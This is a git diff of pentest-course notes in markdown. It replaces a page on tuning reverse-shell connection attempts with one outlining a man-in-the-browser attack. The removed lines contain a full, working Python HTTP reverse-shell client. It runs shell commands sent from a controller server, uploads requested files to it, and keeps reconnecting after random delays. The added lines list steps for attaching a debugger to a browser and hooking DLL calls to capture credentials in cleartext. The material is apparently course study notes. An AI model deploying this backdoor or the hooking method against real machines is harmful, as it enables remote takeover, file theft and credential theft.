@@ -1,16 +1,17 @@
 ---
-title: Tunning the connection attempts
+title: Man in the browser attack
 author: amandaguglieri
 draft: false
 TableOfContents: true
 tags:
   - python
   - python pentesting
-  - scripting
-  - reverse shell
+  - techniques
+  - firefox
+  - browsers
 ---
 
-# Tunning the connection attempts
+# Man in the browser attack
 
 From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).
 
@@ -46,58 +47,28 @@ From course: [Python For Offensive PenTest: A Complete Practical Course](https:/
 		- [Weak service file permission](privilege-escalation.md).
 
 
-## Client side
+All the browsers offer to save username/password when you submit these data into a login page, so on the next time you visit the same login page you will see your username/password are automatically filled in without typing a single letter. Also, there's third party software like lastpass can do the same job for you.  
 
-We put our previous [http shell](coding-an-http-reverse-shell.md) in a function called connect.
+If the target was using this method for login, then neither the keylogger nor the clipboard methods will work.  
 
-```python
-import requests
-import os
-import subprocess
-import time
+Modern hackers have invented a new attack called -man in the browser- to overcome the above scenario.
 
-import random # Needed to generate random 
+In a nutshell, man in the browser attack intercepts the browser API calls and extracts the data (clear text) before it's getting out to the network socket (SSL encrypted).
 
+## Steps to intercept a process API calls are:- 
 
-def connect(): # we put our previous http shell in a function called connect
+A. Get the Process ID (PID) of the browser process 
 
-    while True:
+B. Attach a debugger to this PID 
 
-        req = requests.get('http://127.0.0.1:8080')
-        command = req.text
+C. Specify the DLL library that you want to intercept 
 
-        if 'terminate' in command:
-            return 1 # if we got terminate order, then we exit connect function and return a value of 1, this value will be used to end up the whole script
+D. Specify the function name and resolve its memory  address 
 
+E. Set BreakPoint and register a call back function  
 
-        elif 'grab' in command:
-            grab, path = command.split("*")
-            if os.path.exists(path):
-                url = "http://127.0.0.1:8080/store"
-                files = {'file': open(path, 'rb')}
-                r = requests.post(url, files=files)
-            else:
-                post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not able to find the file!'.encode())
-        else:
-            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stdout.read())
-            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stderr.read())
-    time.sleep(3)
+F. Wait for debug events using debug loop 
 
+G. Once the debug event occur ( meaning once the browser  calls the function inside the DLL),  execute the call back function 
 
-# Here we start our infinite loop, we try to connect to our kali server, if we got an exception (connection error)
-# then we will sleep for a random time between 1 and 10 seconds and we will pass that exception and go back to the 
-# infinite loop once again untill we got a sucessful connection. 
-
-
-while True:
-    try:
-        if connect() == 1:
-            break
-    except:
-        sleep_for = random.randrange(1, 10)#Sleep for a random time between 1-10 seconds
-        time.sleep(int(sleep_for))
-        #time.sleep( sleep_for * 60 )      #Sleep for a random time between 1-10 minutes
-        pass
-
-```
+H. Return the original process   
